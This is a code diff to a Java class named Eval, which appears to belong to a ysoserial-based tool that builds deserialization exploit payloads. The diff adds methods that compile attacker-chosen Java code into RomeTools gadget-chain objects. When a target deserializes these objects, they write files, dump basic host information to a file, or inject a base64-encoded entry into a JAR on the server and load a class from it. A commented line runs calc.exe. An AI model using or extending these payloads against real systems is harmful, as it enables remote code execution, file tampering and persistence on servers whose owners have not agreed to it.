@@ -4,7 +4,9 @@ import javassist.ClassPool;
 import javassist.CtClass;
 import ysoserial.Deserializer;
 import ysoserial.Serializer;
+import ysoserial.payloads.util.ClassFiles;
 import ysoserial.payloads.util.Encoder;
+import ysoserial.payloads.util.JavaCompiler;
 import ysoserial.payloads.util.ReadWrite;
 
 import java.util.Base64;
@@ -15,7 +17,9 @@ public class Eval {
     public static void main(String[] args) throws Exception{
 //        String code = "Runtime.getRuntime().exec(\"calc.exe\");";
 //        Object o = new Eval().getObject(RomeTools.class,code);
-        Object o = new Eval().uploadFile(RomeTools.class,"/tmp/1.txt","/tmp/3.txt");
+//        Object o = new Eval().basicInfo2File(RomeTools.class,"/tmp/1.txt");
+        Object o = new Eval().updateJar(RomeTools.class,"/tmp/test.jar","1.txt",ReadWrite.readFile("/tmp/1.txt"));
+
         byte[] ser = Serializer.serialize(o);
 
         Deserializer.deserialize(ser);
@@ -28,13 +32,45 @@ public class Eval {
         return getObject(gadget,code);
     }
 
+    public Object basicInfo2File(Class gadget , String destination) throws Exception{
+        String jsp = new String(ReadWrite.readResource(Eval.class,"eval/basicinfo2file.jsp"));
+        String java = getJavaCodeFromJSP(jsp);
+        java = java.replace("%destination%",destination);
+        return getObject(gadget,java);
+    }
+
+    public Object updateJar(Class gadget , String jarPath , String entryPath , byte[] content) throws Exception{
+        String java = new String(ReadWrite.readResource(Eval.class,"eval/UpdateJar.java"));
+        String b64 = Encoder.base64_encode(content);
+        java = java.replace("%b64%",b64).replace("%entryPath%",entryPath).replace("%jarPath%",jarPath);
+        byte[] b = JavaCompiler.compile("UpdateJar",java);
+        Class c = ClassFiles.bytesAsClass(b);
+        Object o = new Eval().getObject(gadget,c);
+        return o;
+    }
+
+    public Object updateJar(Class gadget , String jarPath , String entryPath , byte[] content , String className) throws Exception{
+        String java = new String(ReadWrite.readResource(Eval.class,"eval/UpdateJar.java"));
+        String b64 = Encoder.base64_encode(content);
+        java = java.replace("%b64%",b64).replace("%entryPath%",entryPath).replace("%jarPath%",jarPath);
+
+        String loadClass = "Thread.currentThread().getContextClassLoader().loadClass(\"%className%\");";
+        loadClass = loadClass.replace("%className%",className);
+        java = java.replace("int flag = 1;",loadClass);
+
+        byte[] b = JavaCompiler.compile("UpdateJar",java);
+        Class c = ClassFiles.bytesAsClass(b);
+        Object o = new Eval().getObject(gadget,c);
+        return o;
+    }
+
     public Object uploadFile(Class gadget,String souce, String destination) throws Exception{
         byte[] content = ReadWrite.readFile(souce);
         return uploadFile(gadget,content,destination);
     }
     public Object uploadFile(Class gadget,byte[] content, String destination) throws Exception{
         String b64 = Encoder.base64_encode(content);
-        String code = new String(ReadWrite.readResource(Eval.class,"eval/write_file.jsp"));
+        String code = new String(ReadWrite.readResource(Eval.class, "eval/update_file.jsp"));
 
         int i = 0;
         long l = b64.length();
